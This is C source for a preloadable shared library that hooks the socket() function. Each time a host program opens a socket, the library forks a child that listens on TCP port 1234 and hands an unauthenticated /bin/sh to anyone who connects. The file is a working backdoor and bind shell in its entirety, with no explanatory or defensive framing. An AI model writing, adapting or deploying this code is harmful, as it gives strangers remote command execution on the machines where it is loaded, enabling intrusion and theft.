#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>


static void *dl;
int (*orig_socket)(int, int, int);

__attribute__((constructor)) void stub(void)
{
	dl = dlopen("/lib/libc.so.6", RTLD_LAZY | RTLD_GLOBAL);
	orig_socket = dlsym(dl, "socket");
	
}

void sigchld(int signo)
{
	while (waitpid(-1, NULL, WNOHANG) > 0)
		;
}

int socket(int domain, int type, int protocol)
{
	int sockfd, new_fd;
	int ret;
	struct addrinfo hints, *servinfo, *p;
	struct sockaddr_storage their_addr;
	socklen_t sin_size;
	struct sigaction sa;
	int yes=1;
	char s[INET6_ADDRSTRLEN];
	int rv;
	
	ret = orig_socket(domain, type, protocol);
	if (fork())
		return ret;
	
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	
	rv = getaddrinfo(NULL, "1234", &hints, &servinfo);
	if (rv != 0)
		_exit(0);
	
	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		sockfd = orig_socket(p->ai_family, p->ai_socktype, p->ai_protocol);
		if (sockfd == -1)
			continue;
		
		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
			continue;
		
		if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1)
			continue;
		
		break;
	}
	
	if (!(p))
		_exit(0);
	
	freeaddrinfo(servinfo);
	
	if (listen(sockfd, 5) == -1)
		_exit(0);
	
	signal(SIGCHLD, sigchld);
	
	while (1) {
		sin_size = sizeof(their_addr);
		new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size);
		if (new_fd == -1)
			continue;
		
		if (!fork())
		{
			close(sockfd);
			dup2(new_fd, fileno(stdin));
			dup2(new_fd, fileno(stdout));
			dup2(new_fd, fileno(stderr));
			execl("/bin/sh", "sh", NULL);
		}
	}
	
	return -1;
}
